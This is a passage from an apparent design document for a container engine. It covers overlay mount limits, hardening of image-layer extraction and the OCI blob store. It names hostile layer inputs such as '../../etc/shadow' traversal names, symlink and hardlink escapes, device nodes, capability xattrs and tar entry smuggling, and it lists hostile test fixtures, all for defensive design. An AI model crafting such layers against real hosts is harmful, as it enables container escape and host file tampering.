| `fsconfig`, aggregate `lowerdir=` | **255 B for the whole string** | 255 B | ~3 | loud `EINVAL` |
| **`fsconfig`, repeated `lowerdir+`** | **255 B per path** | none | **`OVL_MAX_STACK` = 500** | loud `EINVAL`, with a readable message on the context fd |

**Convention — what the 4095-byte page cost Docker.** `moby/moby@v28.3.1/daemon/graphdriver/overlay2/overlay.go#L73-85`:

```go
	mergedDirName = "merged"
	lowerFile     = "lower"
	maxDepth      = 128

	// idLength represents the number of random characters
	// which can be used to create the unique link identifier
	// for every layer. If this value is too long then the
	// page size limit for the mount command may be exceeded.
	// The idLength should be selected such that following equation
	// is true (512 is a buffer for label metadata).
	// ((idLength + len(linkDir) + 1) * maxDepth) <= (pageSize - 512)
	idLength = 26
```

`(26 + 1 + 1) × 128 = 3584` and `4096 − 512 = 3584`, exactly. The 26-character symlink names in
`/var/lib/docker/overlay2/l/` and the 128-layer depth limit are a **joint solution to the page
limit**, with 512 bytes reserved for SELinux labels. And the driver's own fallback threshold at
`#L574-591` is `if len(mountData) > pageSize-1` — **4095**, the same number, from a completely
independent source.

**Recommendation — what this buys us, stated plainly.** On a kernel ≥ 6.7 we mount images with
arbitrarily many layers directly through `fsopen`/`fsconfig`/`fsmount`/`move_mount`, bounded
only by `OVL_MAX_STACK` = 500, and **we never build overlay2's symlink farm**. That removes an
entire second namespace of names to garbage-collect (Docker has leaked `l/` symlinks in the
past) for no loss. The cost is that **a minimum kernel version becomes an architectural
decision rather than an assumption**: below 6.7 every route — `mount(2)` with `lowerdir=`,
`mount(2)` with `lowerdir+=`, `mount(8)` in any mode, `fsconfig` through the legacy shim —
passes through one 4095-byte page, and the fallback is mandatory rather than optional.

**Recommendation — the fallback, for kernels below 6.7.** Use relative paths plus a `chdir`
into the store root (this is moby's `mountFrom` trick, still present in Docker 28.3.1), not a
symlink farm. With `chdir(<store root>)` and `lowerdir=<chainid>/diff:…` a lower costs ~70
bytes → ~58 layers; with a 16-hex truncated directory name and the full ChainID kept in
metadata, ~21 bytes → ~195 layers. Tradeoff: the `chdir` means a fork/exec or a dedicated
thread with its own working directory.

**Recommendation — three rules, in order, for whichever path we take:**

1. **Probe, do not version-check.** At startup, try `fsopen("overlay")` plus one
   `fsconfig(…, "lowerdir+", …)` and classify. `EINVAL` on `lowerdir+` means pre-6.7 *or* the
   legacy shim; both mean "use the `mount(2)` path".
2. On the `mount(2)` path, **compute the exact option byte count and refuse above 4095 before
   the syscall**, with a message naming the layer count. Silent truncation is the worst
   possible failure mode and this is the only defence.
3. On the `fsconfig` path, **validate every lower path at ≤ 255 bytes and refuse above 500
   layers**, both before the first syscall — and **always `read(2)` the `fs_context` fd on
   failure and surface the string**. Both ceilings are loud, but `EINVAL` names nothing unless
   you read the context fd; that is the single best error-reporting reason to prefer the new
   API, independent of length.

**Recommendation.** Keep our store root shallow. A layer path of
`<root>/layers/userxattr/<64-hex>/diff` is ~90 bytes before the root, so a root deeper than
~160 bytes breaks every `fsconfig` mount with an `EINVAL` that names nothing.

### 10.5 Extraction — the most dangerous code in the project

**Threat model, stated plainly.** The layer tarball is attacker-controlled input, parsed by a
root-privileged process, whose output becomes the root filesystem of a container. Every hazard
below has produced a real CVE, several of them in 2026, several of them in the reference
implementations.

**Recommendation — M1: extract through a pinned directory fd.** Open the layer's destination
directory once, keep the fd, and perform every subsequent operation with `*at()` syscalls
relative to it, resolving paths with
`openat2(dirfd, path, {resolve: RESOLVE_IN_ROOT | RESOLVE_NO_MAGICLINKS})`. This is the only
mitigation that is not a race: it moves the containment decision into the kernel's path walk
instead of our string comparisons. Tradeoff: `openat2(2)` needs Linux **5.6+**, so a fallback
(lexical normalisation plus `O_NOFOLLOW` on every component with a re-`openat` per component)
is required for older targets.

**Fact.** `openat2(2)`: `RESOLVE_IN_ROOT` means "Treat the directory referred to by `dirfd` as
the root directory while resolving `path`" — absolute symlinks and `..` are reinterpreted
against `dirfd`. `RESOLVE_BENEATH` refuses rather than reinterprets; `RESOLVE_NO_SYMLINKS`
forbids symlink resolution entirely.

**Trap.** The man page says `RESOLVE_IN_ROOT` "currently … also disables magic-link resolution"
and immediately adds "However, this may change in the future." Pass `RESOLVE_NO_MAGICLINKS`
explicitly rather than relying on it. Separately, `RESOLVE_IN_ROOT` does **not** stop
mount-point traversal — that is `RESOLVE_NO_XDEV` — which is free insurance for an empty
staging directory and a requirement when walking a populated rootfs.

**Trap.** `openat2` constrains *resolution*, not *operations*. `linkat(2)` against an
already-open fd, `renameat2`, and `fchownat` on a resolved handle are all still our
responsibility, and the hardlink hazard is unaffected because a hardlink has nothing to
resolve.

**Recommendation — M2: extract into a fresh, empty, per-attempt staging directory**, never into
a populated tree and never into a shared root. Most escapes need something pre-existing to aim
at, and cleanup becomes a single recursive remove.

#### The hazards, and the advisories that prove each one

**Path traversal.** Tar stores paths as opaque bytes; nothing prevents `../../etc/shadow` or
`/etc/shadow`. **CVE-2014-6407** (Docker before 1.3.2: "allows remote attackers to write to
arbitrary files and execute arbitrary code via a symlink or hard link attack in an image
archive in a pull or load operation") and **CVE-2014-9356** (Docker before 1.3.3, path
traversal "via a full pathname in a symlink").

*Recommendation:* strip a leading `/`, lexically reject any `..` component **before** any
filesystem call for a good error message, and rely on M1 for the guarantee. Do both.

**Symlink-target escape, and why string-checking a path is insufficient.** The dangerous entry
is not the symlink but a *later* entry resolving through it: the layer contains `escape -> /`
(or `-> /etc`), then `escape/passwd`. A naive extractor opens `<root>/escape/passwd`, the
kernel follows the link, and the write lands on the host. Lexical checking cannot close this,
because between "I verified this path is inside the root" and "I opened it" an adversary —
including *another entry of the same tarball* — can change the answer.

| Advisory | What it was |
|---|---|
| **CVE-2021-32760** (containerd ≤1.4.7, 1.5.0–1.5.3) | "Archive package allows chmod of file outside of unpack target directory" — can "set extended bits like setuid, setgid, and sticky". Fixed 1.4.8 / 1.5.4 |
| **CVE-2018-15664** (`docker cp`) | The classic TOCTOU: the path is resolved, then a component is swapped for a symlink before the operation completes |
| **CVE-2022-23648** (containerd CRI) | A symlink inside an image's declared `Volumes` let a container read arbitrary host files |
| **RUSTSEC-2026-0067 / CVE-2026-33056** (`tar` ≤ 0.4.44, 2026-03-19) | "`unpack_in` can chmod arbitrary directories by following symlinks" — `unpack_dir` used symlink-following `fs::metadata()` to decide whether an existing path was a directory. Fixed 0.4.45 |
| **RUSTSEC-2026-0148 / CVE-2026-46703** (`boxlite` < 0.9.0, CVSS **10.0**, 2026-05-16) | A Rust OCI-image extractor with exactly this bug: a layer with `escape -> /tmp` followed by entries resolving through it writes outside the rootfs. Fixed by introducing a `SafeRoot` handle routing all filesystem operations through `openat2(RESOLVE_IN_ROOT)` |
| **CVE-2026-17106** (`moby/go-archive`, 2026-08-18) | "The tar extraction routines in moby/go-archive (`Unpack`, `UnpackLayer`, `Untar`/`UntarUncompressed`, and the `ApplyLayer` helpers) do not confine filesystem operations to the destination directory. The extractor decides where each archive entry lands using **lexical string checks** and then performs the filesystem operation on a path that is **resolved by the OS**, so links introduced by the archive can be followed out of the destination directory" |

**Trap.** Treat "how the mature implementations do it" as a statement of *intent*, not as
evidence that the approach suffices. **Moby's own extractor was still lexical in August 2026.**

*Recommendation:* M1 is the answer. Additionally: never follow a symlink when *replacing* an
existing entry (`AT_SYMLINK_NOFOLLOW` / `O_NOFOLLOW`, and `unlinkat` first, per the spec's
remove-then-recreate rule); never `chmod`/`chown`/`utimes` a path you did not just create
through the pinned root (that is exactly CVE-2021-32760's mechanism); and set the mode at
`openat`/`mkdirat` time rather than with a follow-up `chmod`.

**Hardlink escape.** Tar type `1` names a link target *inside the archive*. A layer containing
`link` as a hardlink whose `linkname` is `../../etc/shadow` or `/etc/shadow` makes `linkat`
create a second name for the **host's** inode inside the rootfs — bypassing symlink defences
entirely, because there is nothing to resolve out of, and the container can then modify the
host file through it.

*Recommendation:* resolve `linkname` through the **same** pinned root, require the target to
already exist **within this layer's staging directory**, and refuse absolute link targets
outright. A hardlink whose target lives in a *lower* layer cannot be honoured at all under
OverlayFS (the target is in a different tree); copy the target's content and warn, which is
what Docker does and what the spec's "may fail" hints at. Tradeoff: copying breaks shared-inode
semantics and inflates the layer; failing breaks real images.

**Device nodes.** Tar types `3` (char) and `4` (block) carry `devmajor`/`devminor`. A layer
containing `dev/mem` as `c 1 1` or `dev/sda` as `b 8 0`, extracted as root, creates a real
device node in the future container rootfs — a direct path to host memory or disk if the
container's device cgroup, seccomp filter or LSM does not block it.

*Recommendation:* refuse to create device nodes from layer content, **always**, with exactly
one whitelisted case: char `0/0`, and only as the whiteout translation. Record each skipped
node in the layer's metadata so a strict mode can fail rather than warn. Note this is a
deliberate deviation — `layer.md#L40-46` lists block and character devices among the valid file
types — and it is also what a rootless extractor is forced into anyway, since `mknod c 1 1`
returns `EPERM` for any process outside the initial user namespace.

**setuid / setgid / sticky bits.** A layer legitimately contains setuid binaries (`su`, `sudo`,
`ping`), and removing the bits breaks real images. Measured on both test hosts: `chmod 4755` on
a file **you own** succeeds unprivileged — so the setuid bit is not itself privileged; what
makes it dangerous is the *owner*, which an unprivileged extraction cannot set.

*Recommendation:* preserve the bits by default, and make the containment structural — never let
a setuid bit land on a file outside the layer root (M1), and set the mode at create time rather
than by chmod-ing an existing path. The real defence lives in the runtime configuration
(`NoNewPrivileges`, the bounding set), not in the extractor.

**Ownership.** Tar carries numeric `uid`/`gid`. Root-mode extraction uses `fchownat(…,
AT_SYMLINK_NOFOLLOW)` with the numeric ids as given, through the pinned root —
`AT_SYMLINK_NOFOLLOW` is not optional, because chowning a symlink entry without it chowns its
*target*, which is another escape. Rootless extraction needs a uid/gid map backed by
`/etc/subuid`+`/etc/subgid` and `newuidmap`/`newgidmap`.

**Trap.** With no subuid range, `chown 65534` inside a single-UID user namespace returns
**`EINVAL`**, not `EPERM`, because the uid is not in the namespace's map. Detect the missing
range and fail with a specific message rather than silently squashing every file to the
invoking uid — silent squashing makes `nobody`-owned directories writable by the container's
root, which is a real privilege change, not a cosmetic one.

**xattrs, and `security.capability` in particular.** Layer tars carry xattrs in PAX records
under the `SCHILY.xattr.<name>` convention (older Docker also wrote
`LIBARCHIVE.xattr.<urlencoded-name>`); `layer.md#L58` requires xattrs to be included without
naming the encoding, so the encoding itself is convention. `security.capability` grants a
non-setuid binary specific capabilities on exec — a layer shipping `/usr/bin/evil` with
`security.capability = CAP_SYS_ADMIN` is a setuid-root binary in all but name.

**Trap.** Written from inside a user namespace, the kernel silently **rewrites** the value:

```
written inside userns : security.capability=0x0100000200002000000000000000000000000000   (v2)
read back outside     : security.capability=0x01000003000020000000000000000000000000004501802e   (v3 + rootid)
```

The trailing four bytes little-endian are the host uid of the namespace's root. This is
`VFS_CAP_REVISION_3` namespaced file capabilities: a v2 set written from a userns becomes v3
with a `rootid`, honoured only for processes whose namespace root maps to that uid. Two
consequences: the extracted bytes differ from the layer, so any "verify extraction by
re-tarring" self-check must exclude xattrs; and the capability is bound to the extracting
user's uid, so moving the store or remapping subuids kills it.

*Recommendation:* drop `security.*` and `system.*` xattrs by default, behind a
`--preserve-capabilities` opt-in. Reason: few images genuinely need file capabilities, the
blast radius of getting it wrong is privilege escalation, and `security.selinux` from a layer
would let an image choose its own LSM label. Preserve `user.*`; **never** let a layer set an
`overlay.*` xattr in either namespace. Tradeoff: unprivileged `ping` breaks in some images —
documented and recoverable.

**Decompression amplification.** **CVE-2017-14992** (moby: "Lack of content verification …
allows a remote attacker to cause a Denial of Service via a crafted image layer payload, aka
gzip bombing") and **CVE-2023-25153** (containerd ≤1.5.17, 1.6.0–1.6.17: "When importing an OCI
image, there was no limit on the number of bytes read for certain files", CWE-400, fixed
1.6.18/1.5.18).

*Recommendation:* three independent limits, all cheap. (1) The layer descriptor's `size` is
REQUIRED by the spec — read **at most** that many compressed bytes and error if the stream
continues; this alone bounds the download. (2) A configured cap on **uncompressed** bytes per
layer and per image, counted out of the decompressor. (3) A cap on entry count per layer and on
any single entry's size. And cap the manifest/config JSON size (e.g. 4 MiB) before parsing —
that is precisely the shape of CVE-2023-25153, an unbounded read of a *metadata* file.

**Tar format edge cases, and the parser-differential class.** This is the hazard that defeats
every mitigation above, because the smuggled entries are *invisible* to one parser and
*extracted* by another.

| Advisory | Direction |
|---|---|
| **CVE-2025-62518** (`astral-tokio-tar` < 0.5.6, 2025-10-21) | "a boundary parsing vulnerability that allows attackers to **smuggle additional archive entries** by exploiting inconsistent PAX/ustar header handling. When processing archives with PAX-extended headers containing size overrides, the parser incorrectly advances stream position based on ustar header size (often zero) instead of the PAX-specified size, causing it to **interpret file content as legitimate tar headers**" |
| **RUSTSEC-2026-0068 / CVE-2026-33055** (`tar` ≤ 0.4.44, 2026-03-19) | The inverse: "tar-rs incorrectly ignores PAX size headers if header size is nonzero … the tar-rs crate is an outlier in checking for the header size — other tar parsers (including Go `archive/tar`) unconditionally use the PAX size override" |

**Trap.** This is also the only hazard that can make `diff_id` verification *lie*. We hash the
uncompressed byte stream, which is honest; what we **extract** from it depends on where we
think the entry boundaries are.

*Recommendation:* three rules. (1) Honour a PAX `size` record **unconditionally** when present,
exactly as Go's `archive/tar` does, and reject any entry where a PAX `size` record is present
*and* disagrees with a non-zero ustar size field — do not pick one silently. (2) Pin
`tar >= 0.4.45`: 0.4.45 fixed both RUSTSEC-2026-0067 and -0068. (3) After each entry, **assert
the stream cursor**: bytes consumed must equal `round_up(size, 512)`. A parser differential
cannot survive an explicit cursor check.

**The remaining name and format hazards:**

| Hazard | Rule |
|---|---|
| PAX `path=` / `linkpath=` overriding the ustar `name`/`linkname` | Resolve the **effective** path first, then validate, then use. Validate exactly the bytes you will pass to the kernel |
| PAX **global** headers (type `g`) | Ignore entirely — no layer needs them and they silently apply to later entries |
| GNU LongName/LongLink (`L`/`K`) | Support, under the length caps below |
| GNU/PAX sparse (`S`, `GNU.sparse.*`) | **Reject** — the spec says SHOULD NOT, and three incompatible encodings is the most error-prone decoder in the format |
| tar type `7` (contiguous) | Map to regular |
| tar types `A`–`Z` (vendor) | **Reject**, naming the type byte |
| Duplicate paths within one layer | **Reject** — the spec says MUST NOT, and a duplicate is the shape of a validate-then-replace attack |
| Trailing garbage after the two zero blocks | Read to EOF for the digest, stop **extracting** at the end-of-archive marker. (`flate2`'s `GzDecoder` stops at the end of the first gzip member, which is what we want: a multi-member stream is data smuggling and should be rejected, not concatenated by `MultiGzDecoder`) |
| Long paths | Reject above 4096 bytes total, 255 bytes per component, or a configured depth cap (e.g. 256). An unbounded-depth layer is a cleanup denial of service — our own recursive remove cannot delete it |
| Names | Treat tar paths as **opaque bytes** (`OsStr`/`Vec<u8>`, never `String`). Do not Unicode-normalise, case-fold or re-encode: Linux paths may be invalid UTF-8, and NFC/NFD normalisation makes two distinct legal paths collide so that a check-then-write pair disagrees. Reject a NUL byte, a component that is exactly `.` or `..`, and an entry name ending in `/` whose type is not directory |

#### The pinned-root rule is an engine rule, not an extractor rule

**Fact.** Three separate projects shipped the same class of bug in 2024–2026, and in every case
the *extraction* code was already fixed. The bug had moved to every later path operation on an
extracted tree.

- **CVE-2026-41579** (runc, 2026-07-01): "when setting up the container rootfs, `setupPtmx` and
  `setupDevSymlinks` call `os.Remove` and `os.Symlink` with a `filepath.Join` string which
  allow **an image with `/dev` as a symlink** to trick runc into deleting files called `ptmx` on
  the host or creating a hardcoded set of symlinks … in an arbitrary pre-existing host
  directory. **This issue is not exploitable under Docker, because Docker creates a top-level
  read-only layer that masks any malicious `/dev` symlink present in the container image** —
  unlike some other Linux container tooling." Fixed in runc 1.3.6 / 1.4.3 / 1.5.0.
- **CVE-2026-55686** (Podman 3.0.0–5.7.0, 2026-06-26): "running a malicious container image
  where the **WORKDIR** path contains a symlink can create a directory or modify ownership on
  the host filesystem." Fixed 5.7.1.
- **CVE-2024-9676** (containers/storage; Podman, Buildah, CRI-O): "will read `/etc/passwd`
  inside the container, but does not properly validate if that file is a symlink, which can be
  used to cause the library to read an arbitrary file on the host." Our `User` resolution —
  image config `User: "nginx"` → uid — reads exactly that file.

**Fact — the "top-level read-only layer" in the runc advisory is Docker's `-init` layer.**
Its contents on a live host are exactly the mountpoints the runtime needs: `/dev`, `/dev/pts`,
`/dev/console`, `/dev/shm`, `/.dockerenv`, `/etc`, `/etc/mtab`, `/etc/hostname`, `/etc/hosts`,
`/etc/resolv.conf`. By placing real directories at those paths **above** whatever the image put
there, it made Docker non-exploitable for a 2026 runc escape.

**Recommendation — this turns the init layer from a cost tradeoff into a containment
requirement.** Skipping it is defensible **only if** the replacement creates those mountpoints
through a pinned-root `openat2(RESOLVE_IN_ROOT | RESOLVE_NO_MAGICLINKS)` walk that refuses to
traverse an image-supplied symlink, and `unlinkat`s any existing non-directory at each
mountpoint before `mkdirat`. Never by joining strings. The alternative — implement the init
layer — is one extra read-only lower directory and makes the whole class structurally
impossible.

**Recommendation.** Generalise it: **every path the engine ever derives from image-controlled
data** — the rootfs mountpoints, `WorkingDir`, `/etc/passwd` for `User`, `Volumes`, the merged
mount target — must go through the same `RESOLVE_IN_ROOT` handle as the extractor.

#### Using the `tar` crate safely

**Fact.** `tar` 0.4.46's defaults, from `alexcrichton/tar-rs@0.4.46/src/archive.rs#L55-69`:

| Setting | Default | Consequence |
|---|---|---|
| `preserve_permissions` | **false** | setuid/setgid bits dropped — `su` and `ping` silently do not work |
| `preserve_ownerships` | **false** | every file owned by the extracting user; multi-uid images flattened |
| `unpack_xattrs` | **false** | all xattrs dropped (what we want, but by accident rather than policy) |
| `preserve_mtime` | **true** | fine |
| `overwrite` | **true** | existing files **and symlinks** replaced — this is the default that made RUSTSEC-2026-0067 exploitable |
| `ignore_zeros` | **false** | the iterator stops at the two zero blocks, which is the behaviour we want. Do not "fix" it |
| `mask` | `0` | a umask-like mode mask, applied inverted |

So a naive `Archive::unpack()` is safe-ish but *incorrect*: it produces a rootfs that will not
run a real image. Turning the three flags on makes it correct **and** hands the archive full
control of ownership, setuid bits and xattrs, re-arming every hazard above with no containment.

**Recommendation.** Use `tar` as a header **parser** and own the filesystem layer ourselves:
iterate `Archive::entries()`, read `entry.header()`, `entry.path_bytes()` and
`entry.link_name_bytes()`, apply the validation above, and perform every filesystem operation
through the pinned root. Never call `unpack`/`unpack_in`. Reasons: we must implement the
whiteout translation and the device-node/xattr policy anyway, so `unpack` cannot be used as-is;
the advisories above are exactly the code path we would be trusting. Tradeoff: we own a few
hundred lines of `*at()`-syscall extraction logic — deliberately, with tests, instead of
inheriting someone else's escape. Note the split is not clean: the crate's hazards are in its
header parsing too, which is why the cursor assertion is ours regardless.

**Recommendation — build a hostile-layer fixture set before writing the extractor**, because
these tests cannot be obtained from Docker Hub: a tar with `../../etc/passwd`; an absolute
`/etc/passwd`; a symlink `x -> /etc` followed by `x/passwd`; a hardlink to `/etc/shadow`; a
`c 1 3` device node; a `4755` root-owned binary; a `security.capability` xattr; a gzip bomb; a
5000-byte path; a 300-component path; a PAX `path=` that disagrees with the ustar `name`; a PAX
`size=` that disagrees with a non-zero ustar size; a duplicate path; a sparse entry; a bare
`.wh.`; and an opaque marker placed *after* the sibling it must hide. It is roughly a hundred
lines of generator and it is the highest-value test asset in the project.

### 10.6 The content-addressed store

**Fact — the on-disk layout is the one thing in this domain that is specified.**
`image-spec@v1.1.1/image-layout.md`:

```
./oci-layout                     {"imageLayoutVersion": "1.0.0"}        REQUIRED
./index.json                     an image index; the entry point        REQUIRED
./blobs/<algorithm>/<encoded>    e.g. blobs/sha256/<64 hex>             REQUIRED (may be empty)
```

The filename is the **encoded** part of the digest only (no `sha256:` prefix), the file's
content digest MUST equal its path, tags are expressed as `org.opencontainers.image.ref.name`
annotations on `index.json` entries, and everything — manifests, indexes, configs, layers — is
just a blob. There is no separate manifest directory and **no sharding**; Docker's registry
shards by the first two hex characters, the OCI layout does not.

**Recommendation — adopt the layout verbatim and split the store in three.**

```
<root>/oci-layout                      # {"imageLayoutVersion":"1.0.0"}
<root>/index.json                      # tags, as ref.name annotations → index digests
<root>/blobs/sha256/<hex>              # immutable, digest-addressed, exactly as transferred
<root>/ingest/<ref-derived>/{data,meta}  # in-flight downloads
<root>/layers/<xattr-ns>/<chainid>/diff  # extracted per-layer diffs (ns = trusted|userxattr)
<root>/containers/<id>/{upper,work,merged}
<root>/meta/                           # tag→digest, chainid→dir, diffid-by-digest, roots
<root>/storeVersion                    # one line, so a future migration is detectable
```

Reasons: the layout is interoperable (a `skopeo copy docker://alpine oci:<root>:alpine` is a
zero-code import path **and** a free test oracle), and the three-store split mirrors
containerd's, where the content store is immutable and content-addressed while the layer store
is mutable and stack-addressed — which makes blob GC and layer GC independent problems with
independent lifetimes. Tradeoff: several things to keep consistent; mitigate by making only
`meta/` authoritative and everything else reconstructible.

**Recommendation.** Keep *blob download staging* and *layer extraction staging* in different
directories. They have different lifetimes, and conflating them makes the sweeper's rules
ambiguous. (Both containerd and Docker end up with a separate scratch location for the same
reason.)

**Fact — the invariant to defend: a file at `blobs/sha256/<hex>` always has content whose
digest is `<hex>`.** Everything else follows from it. The procedure per blob:

1. `open(ingest/<name>/data, O_CREAT|O_EXCL|O_WRONLY)`.
2. Stream, hashing as you write — both hashes for a layer.
3. On completion compare digests; on mismatch unlink and fail, naming both.
4. `fsync(data_fd)`, then `close`.
5. `renameat(ingest/<name>/data → blobs/sha256/<hex>)`.
6. **`fsync` the `blobs/sha256/` directory fd.**

**Fact.** Steps 4–6 are necessary and sufficient: `rename(2)` is atomic within a filesystem,
but neither the data's durability before the rename becomes visible nor the directory entry's
durability is guaranteed. `fsync(2)`: "Calling fsync() does not necessarily ensure that the
entry in the directory containing the file has also reached disk. For that an explicit fsync()
on a file descriptor for the directory is also needed."

**Convention.** containerd's `Commit` (`containerd@v1.7.27/content/local/writer.go#L78-140`)
does `fp.Sync()` → size check → digest check → `os.Rename` and **has no directory fsync**. Its
blob store can therefore lose, after a power loss, a blob whose data was synced and whose
directory entry was not — recoverable, since the next pull re-downloads, but a real gap. Our
step 6 is deliberately stricter than the reference implementation.

**Recommendation.** Two refinements borrowed from containerd's version, both cheap:

- Handle the "someone else committed this blob while we were downloading" race by checking for
  the target before the rename and **discarding** our copy rather than overwriting — the content
  is identical by construction.
- `utimensat` the committed blob after the rename, so its mtime means "committed at", not
  "download started at". This is what makes a "young object" grace period in the sweeper
  actually sound; without it the grace window is computed from the wrong timestamp.

**Recommendation — name the ingest directory deterministically from the pull ref, and serialise
writers with a lock.** containerd does exactly this
(`containerd@v1.7.27/content/local/store.go#L648-653`):

```go
func (s *store) ingestRoot(ref string) string {
	// we take a digest of the ref to keep the ingest paths constant length.
	// Note that this is not the current or potential digest of incoming content.
	dgst := digest.FromString(ref)
	return filepath.Join(s.root, "ingest", dgst.Encoded())
}
```

**Trap.** A random per-attempt name looks safer — "two concurrent pulls must not share a partial
file" — but it makes **resume unimplementable**: a restarted process has no way to find the
previous attempt except by scanning every `ingest/*/meta` and matching digests, which also has
to resolve the case of two abandoned attempts for the same blob. A ref-derived name makes
resume a single `stat`, and the concurrency worry is real but is solved by a lock on the ref,
not by name uniqueness. Note the name derives from the **ref**, not the digest: the same blob
may be pulled under different refs, and you want per-pull progress.

**Recommendation — resume by re-hashing the prefix.** Keep `ingest/<name>/meta` with
`{ref, digest, expected_size, bytes_written, started_at}`; on resume, re-`GET` the
`/v2/<name>/blobs/<digest>` URL — never a stored CDN URL — with `Range: bytes=<bytes_written>-`,
and feed the already-written prefix back through the hasher first. Validate that the stored
`ref` and total size match before resuming; a mismatch means a different pull's ingest
directory. Reason: sha256 is not resumable across process restarts without re-reading the
prefix or serialising the hasher state; re-reading local disk is fast and obviously correct.
containerd does the same thing and names the same tradeoff in its own source comment
(`content/local/store.go#L500-527`: `// TODO(stevvooe): slow slow slow!!, send to goroutine or
use resumable hashes`).

**Recommendation — do not fsync every extracted file.** A layer with 50 000 files would issue
50 000 fsyncs. Extract into `layers/<ns>/.tmp-<uuid>/`, then `renameat` the directory into
place, then fsync the parent. Record the layer as valid in `meta/` only *after* the rename, and
treat any `layers/*` directory with no metadata record as garbage at startup. Tradeoff: after
an unclean shutdown a layer directory may be present-but-incomplete, which the metadata rule
turns into a re-extraction rather than a corrupt mount.

**Recommendation — garbage collection is mark-and-sweep from explicit roots, not per-object
refcounts.** Roots are (a) every entry in `index.json`, (b) every existing container, **and (c)
every in-flight pull**. Sweep anything in `blobs/`, `layers/` and `ingest/` not reachable.
Reason: refcounts require every mutation to be transactional with the counter, and a crash
between "write blob" and "increment count" either leaks or — worse — under-counts and deletes
live data. Mark-and-sweep is crash-safe by construction: an interrupted pull leaves garbage,
and garbage is what the sweeper is for. Tradeoff: GC is O(store size) rather than O(1) per
delete.

**Trap.** Root set (c) is not optional. A pull that has committed layers 0–4 and is still
fetching layer 5 has no tag pointing at anything, so a sweep at that moment **deletes the four
committed layers out from under it**. That is what containerd's leases exist for. A "young
object" grace period mitigates it only if the window exceeds the longest pull, which for a 20 GB
image it will not.

**Recommendation.** The cheap lease: a `meta/roots/<pull-id>` file listing the digests an
in-flight pull depends on, created before the first blob is committed and removed at the end;
the sweeper treats each such file as a root, and a stale file is swept by the same expiry rule
as `ingest/`. ~20 lines, and it removes the one failure mode where GC destroys live data rather
than merely leaking.

**Fact — a constraint from the runtime spec that lands directly on the store.**
`runtime-spec@v1.3.0/runtime.md`, Delete: "Deleting a container MUST delete the resources that
were created during the `create` step. **Note that resources associated with the container, but
not created by this container, MUST NOT be deleted.**" That is the spec forbidding exactly the
bug where deleting a container removes a shared layer directory or a bind-mount source.

**Recommendation — concurrency.** Download layers in parallel (bounded; Docker's defaults are 3
concurrent downloads and 5 uploads) but **apply them strictly in manifest order**, because
layer *n*'s ChainID depends on *n−1*. A "download ahead, extract in order" pipeline is the
standard shape, and the queue depth is the only tuning knob that matters.

**Recommendation — what the MVP can defer**, none of which changes the store layout or the
extracted bytes:

| Deferred | Note |
|---|---|
| `tar-split` | It exists so a layer held only in extracted form can be pushed with its original blob digest reproduced. `image-spec@v1.1.1/config.md` does name it — "Layers SHOULD be packed and unpacked reproducibly … for example by using tar-split" — but that SHOULD is about **producing** layers, which we do not do. Keeping the compressed blob costs ~40% extra disk; tar-split costs a subtle reimplementation of tar byte preservation. Disk is cheaper |
| The reverse `diff_id`→source-repository map | Push-time only |
| Leases beyond the single in-flight root file | The root file covers the one dangerous case |
| A second storage backend behind the mount-spec boundary | Keep the boundary clean (compute mount options and return them; a separate step performs the mount), which also makes the overlay logic testable without root by asserting on the option list. Do not build a pluggable trait for one implementation |
| zstd layers, `metacopy`/`xino` tuning, the `referrers` API, push, authenticated registries | None touches the store |

**Trap.** The init layer is **not** on that list in the usual sense. Deferring it is acceptable
only with the pinned-root mountpoint creation described above; deferring it *and* joining
strings to create `/dev` and `/etc/*` reintroduces CVE-2026-41579's class.

### What this decides

| Decision | Urgency |
|---|---|
| **Minimum kernel version is an architectural decision.** ≥ 6.7 gives `fsconfig` + `lowerdir+` and up to 500 layers with no symlink farm; below it every route passes one 4095-byte page and the relative-path + `chdir` fallback is mandatory | **Urgent — decide now.** It determines whether the fallback path exists at all |
| Probe `fsopen` + one `lowerdir+` at startup; never version-check | **Urgent** — it is the decision procedure for the above |
| Validate option length (≤4095 on `mount(2)`), per-path length (≤255 on `fsconfig`), and layer count (≤500) **before** the syscall; read the `fs_context` fd on failure | **Urgent** — silent truncation has no other defence |
| Store root must stay shallow (~160 bytes) so `<root>/layers/<ns>/<64-hex>/diff` fits in 255 | **Urgent** — it constrains the layout we are about to commit to |
| Extractor emits an **overlay-native per-layer diff** from the first rung, not a merged tree; a merged tree is produced by mounting or by a small flatten helper | **Urgent** — it is baked into the extracted bytes and changing it means re-extracting every layer |
| Layer store is partitioned by **xattr namespace**, recorded per layer, and mismatched mounts are refused | **Urgent** — adding the partition later is a store wipe |
| Layer directories are keyed by **ChainID** from the first rung that writes one | **Urgent** — changing the key later means every user re-downloads and re-extracts |
| Blob store is the OCI image layout verbatim, unsharded | **Urgent** — same reason |
| Compare **mount ids** (`statx(STATX_MNT_ID)`), not `st_dev`, for upper/work | Deferrable to the first overlay mount, but the `st_dev` check is wrong and must not be written |
| Read-only containers use a tmpfs upper plus a VFS-level read-only mount, not a bare single `lowerdir` | Deferrable — but it fails on `alpine`, the first image anyone tests |
| Ingest directories are ref-derived and lock-serialised, not randomly named | **Urgent** — the random name makes resume unimplementable |
| GC roots include in-flight pulls (`meta/roots/<pull-id>`) | **Urgent** — without it a mid-pull sweep deletes live data |
| Pin `tar >= 0.4.45`, use it as a header parser only, assert `bytes_consumed == round_up(size,512)` | **Urgent** — two 2026 advisories, one of them in header parsing |
| Every image-derived path in the **engine** (mountpoints, `WorkingDir`, `/etc/passwd`, `Volumes`) goes through the same pinned-root handle | **Urgent** — three projects shipped this bug after fixing extraction |
| Build the init layer, or create its mountpoints through the pinned root | **Urgent as a decision**, deferrable as code — but it is a containment requirement, not a `docker diff` nicety |
| Drop `security.*`/`system.*` xattrs by default; refuse device nodes; reject duplicates and sparse entries | Deferrable to the extractor rung — all are policy defaults, cheap to set correctly first |

---

## 11. Networking

**Fact.** The OCI Runtime Specification defines exactly one networking construct: an entry in the
`linux.namespaces` array of type `network`. With no `path`, the runtime must create a new network
namespace; with a `path`, it must join the existing one that path names. There is no interface
definition, no address, no route, no port mapping, no IPAM, no DNS, and no firewall anywhere in the
specification.
Source: `runtime-spec@v1.3.0/config-linux.md §Namespaces`.

**Fact.** The only other networking-relevant guarantee the spec gives is hook ordering.
`createRuntime` hooks run *after* the container's namespaces are created and *before* `pivot_root`,
and they execute **in the runtime's namespaces**, not the container's; the container's pid arrives
in the `state` JSON on the hook's stdin, which is how such a hook reaches `/proc/<pid>/ns/net`.
